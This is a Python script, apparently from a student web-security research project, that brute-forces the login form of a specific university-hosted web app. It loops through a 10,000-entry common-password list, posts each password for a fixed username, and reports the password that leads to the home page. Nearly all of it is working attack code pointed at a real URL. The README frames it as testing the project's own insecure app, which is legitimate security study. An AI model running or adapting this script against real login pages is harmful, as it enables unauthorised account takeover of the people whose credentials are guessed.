'''README: MUST BE LOGGED INTO VPN FOR THIS SCRIPT TO WORK
Python script that brute forces passwords on our insecure version of our web app.
Since there are no password requirements or limted login attempts, it attempts
common passwords. Iterates through text file containing common passwords. May take
a few minutes for the scrip to run.
'''
import requests

# URL of the login page
login_url = 'https://web.engr.oregonstate.edu/~snelgrot/index.php'

#replace with your file location of  have most-common.txt
with open("C:\\xampp\\htdocs\\Web-Sec-Research-Proj\\10k-most-common.txt", "r") as file:
    for line in file:
    # User credentials. Use common username ie dave, bob, paul, johnathan, tyler
        username = 'johnathan'
        password = line
        password = password.rstrip("\n")


        # POST data for login
        data = {
            'user_name': username,
            'password': password
        }

        # Send POST request to log in
        response = requests.post(login_url, data=data)

        # Check if the login was successful
        if response.status_code == 200:  # Assuming the server responds with a status code of 200 for a successful login

            current_page_url = response.url
            if current_page_url== 'https://web.engr.oregonstate.edu/~snelgrot/home.php':
                print("This password worked: " + password)
                file.close()
                exit()
            else:
                continue

    else:

        print("Password not found")
        file.close()
